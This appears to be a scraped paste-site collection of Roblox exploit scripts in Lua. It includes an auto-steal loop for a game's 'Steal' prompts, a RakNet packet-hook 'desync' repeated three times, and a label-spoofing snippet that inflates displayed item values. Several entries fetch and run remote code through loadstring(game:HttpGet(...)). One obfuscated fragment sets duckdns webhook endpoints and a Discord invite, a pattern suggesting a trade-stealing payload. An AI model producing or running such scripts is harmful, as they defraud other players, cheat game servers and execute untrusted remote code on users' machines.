title:
Auto grab sab

local stealCooldown = 0.2
local HOLD_DURATION = 0.5
local USE_TEL
author: Notrexy
content:
local stealCooldown = 0.2
local HOLD_DURATION = 0.5
local USE_TELEPORT = false

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local function getCharacter()
    return LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
end

local function getHRP()
    local char = getCharacter()
    return char:WaitForChild("HumanoidRootPart", 5)
end

local HRP = getHRP()
local Humanoid = getCharacter():WaitForChild("Humanoid")

LocalPlayer.CharacterAdded:Connect(function(newChar)
    HRP = newChar:WaitForChild("HumanoidRootPart", 5)
    Humanoid = newChar:WaitForChild("Humanoid")
end)

local function getPromptPart(prompt)
    local parent = prompt.Parent
    if parent:IsA("BasePart") then return parent end
    if parent:IsA("Model") then
        return parent.PrimaryPart or parent:FindFirstChildWhichIsA("BasePart")
    end
    if parent:IsA("Attachment") then return parent.Parent end
    return parent:FindFirstChildWhichIsA("BasePart", true)
end

local function findNearestStealPrompt()
    local nearestPrompt = nil
    local minDist = math.huge
    local plots = workspace:FindFirstChild("Plots")
    if not plots then return nil end

    for _, desc in pairs(plots:GetDescendants()) do
        if desc:IsA("ProximityPrompt") and desc.Enabled and desc.ActionText == "Steal" then
            local part = getPromptPart(desc)
            if part then
                local dist = (HRP.Position - part.Position).Magnitude
                if dist < minDist then
                    minDist = dist
                    nearestPrompt = desc
                end
            end
        end
    end
    return nearestPrompt
end

local function triggerPrompt(prompt)
    if not prompt or not prompt:IsDescendantOf(workspace) then return end

    prompt.MaxActivationDistance = 9e9
    prompt.RequiresLineOfSight = false
    prompt.ClickablePrompt = true

    local usedFire = pcall(function()
        fireproximityprompt(prompt, 9e9, HOLD_DURATION)
    end)

    if not usedFire then
        pcall(function()
            prompt:InputHoldBegin()
            task.wait(HOLD_DURATION)
            prompt:InputHoldEnd()
        end)
    end
end

while true do
    local prompt = findNearestStealPrompt()
    if prompt then
        triggerPrompt(prompt)
    end
    task.wait(stealCooldown)
end

title:
Desync 
local uis = game:GetService("UserInputService")
local hooked = false
loc
author: Notrexy
content:
local uis = game:GetService("UserInputService")
local hooked = false
local toggle = Enum.KeyCode.U -- Keybind is U Press U To Activate Desync and Turn it off

local function rakhook(packet)
    if packet.PacketId == 0x1B then
        local buf = packet.AsBuffer
        buffer.writeu32(buf, 1, 0xFFFFFFFF)
        packet:SetData(buf)
    end
end

uis.InputBegan:Connect(function(obj)
    if obj.KeyCode ~= toggle then return end

    if hooked then
        raknet.remove_send_hook(rakhook)
    else
        raknet.add_send_hook(rakhook)
    end

    hooked = not hooked
end)

print("placeid,jobid,gameid",game.PlaceId,game.JobId,game.GameId)

content:
if not pcall(function()
    local unusedNumbers = { 59, 57 }
    local graphemeIterator = utf8.graphemes("test")
    local thirdGrapheme = graphemeIterator[3]
    local secondGrapheme = graphemeIterator[2]
    local firstGrapheme = graphemeIterator[1]
    thirdGrapheme, unusedValue = firstGrapheme(secondGrapheme, thirdGrapheme)
    if thirdGrapheme then
        return thirdGrapheme
    end
    return
end) then
    while task.wait() do
        error("copper anti temper")
    end
    error("copper anti temper")
end

setclipboard("discord.gg/") -- changed discord invite
if getgenv().SAB_TRADE_ONCE then
    return
end
getgenv().SAB_TRADE_ONCE = true
getgenv().StatusApi = "https://statusplayers.duckdns.org"
getgenv().Protectors = "https://protectorapi.duckdns.org/api/webhook-protector"

local a = rawget(getgenv(), "Username") -- useless variable

title:
for _,obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("TextLabel"
author: ! 𝑺𝒌𝒊𝒛𝒛𝒚
content:
for _,obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("TextLabel") then
            if obj.Text == "Secret" then
                obj.Text = "OG"
                obj.TextColor3 = Color3.fromRGB(255,215,0)
            end
        end
    end

    for _,obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("TextLabel") then
            local text = obj.Text
            if text:lower():find("brainrot") and text:find("750M") then
                obj.Text = text:gsub("750M","50B")
            end
        end
    end

title:
Nuevo Desync by Roman666cabj
 local uis = game:GetService("UserInputService")
lo
author: 𝙰𝙽𝚃𝙴𝚉𝙰𝙽𝙰 247
content:
local uis = game:GetService("UserInputService")
local hooked = false
local toggle = Enum.KeyCode.U -- Keybind is U Press U To Activate Desync and Turn it off

local function rakhook(packet)
    if packet.PacketId == 0x1B then
        local buf = packet.AsBuffer
        buffer.writeu32(buf, 1, 0xFFFFFFFF)
        packet:SetData(buf)
    end
end

uis.InputBegan:Connect(function(obj)
    if obj.KeyCode ~= toggle then return end

    if hooked then
        raknet.remove_send_hook(rakhook)
    else
        raknet.add_send_hook(rakhook)
    end

    hooked = not hooked
end)

title:
RADGOLL TIMER FOR UR SCRIPT local function triggerRagdoll()
    local char = LP.
author: 𝙰𝙽𝚃𝙴𝚉𝙰𝙽𝙰 247
content:
local function triggerRagdoll()
    local char = LP.Character
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end
    pcall(function()
        hum.PlatformStand = true
        task.wait(0.5)
        hum.PlatformStand = false
        hum:ChangeState(Enum.HumanoidStateType.GettingUp)
    end)
end

local function startRagdollTimer()
    if ragdollTimerConn then task.cancel(ragdollTimerConn); ragdollTimerConn = nil end
    ragdollTimerConn = task.spawn(function()
        while ragdollTimerEnabled do
            task.wait(ragdollTimerInterval)
            if ragdollTimerEnabled then
                pcall(triggerRagdoll)
            end
        end
    end)
end

local function stopRagdollTimer()
    ragdollTimerEnabled = false
    if ragdollTimerConn then task.cancel(ragdollTimerConn); ragdollTimerConn = nil end
end

title:
Desync 
local uis = game:GetService("UserInputService")
local hooked = false
loc
author: Notrexy
content:
local uis = game:GetService("UserInputService")
local hooked = false
local toggle = Enum.KeyCode.U -- Keybind is U Press U To Activate Desync and Turn it off

local function rakhook(packet)
    if packet.PacketId == 0x1B then
        local buf = packet.AsBuffer
        buffer.writeu32(buf, 1, 0xFFFFFFFF)
        packet:SetData(buf)
    end
end

uis.InputBegan:Connect(function(obj)
    if obj.KeyCode ~= toggle then return end

    if hooked then
        raknet.remove_send_hook(rakhook)
    else
        raknet.add_send_hook(rakhook)
    end

    hooked = not hooked
end)

title:
op for pubs server hop on M keybind

-- Load the module once
local module = load
author: tenacious
content:
-- Load the module once
local module = loadstring(game:HttpGet("https://raw.githubusercontent.com/LeoKholYt/roblox/main/lk_serverhop.lua"))()

-- Function to server hop
local function serverHop()
    module:Teleport(game.PlaceId)
end

-- Keybind (press M)
local UserInputService = game:GetService("UserInputService")

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end

    if input.KeyCode == Enum.KeyCode.M then
        serverHop()
    end
end)

title:
blox fruits #bloxfruit #bf 

-- Blox Fruits: Private Server + PlaceId Router (no
author: Yusf
content:
-- Blox Fruits: Private Server + PlaceId Router (no safe load)

local ReplicatedStorage = game:GetService("ReplicatedStorage")

local BF_PLACEIDS = {
    [4442272183] = true,
    [7449423635] = true,
    [100117331123089] = true,
    [79091703265657] = true,
}

local function isPrivateServer_ByOwnerId()
    local privateServerOwner = ReplicatedStorage:WaitForChild("PrivateServerOwnerId")
    if privateServerOwner and privateServerOwner:IsA("IntValue") then
        return privateServerOwner.Value > 0
    end
    return false
end

local isBFPlace = BF_PLACEIDS[game.PlaceId] == true
local isPrivate = isPrivateServer_ByOwnerId()

if isBFPlace and not isPrivate then
    -- Public server + đúng placeid
    loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/gpandjoiner"))()
else
    -- Sai placeid OR đúng placeid nhưng private -> chạy key
    loadstring(game:HttpGet("https://raw.githubusercontent.com/okkkkk112/pro/refs/heads/main/key"))()
end
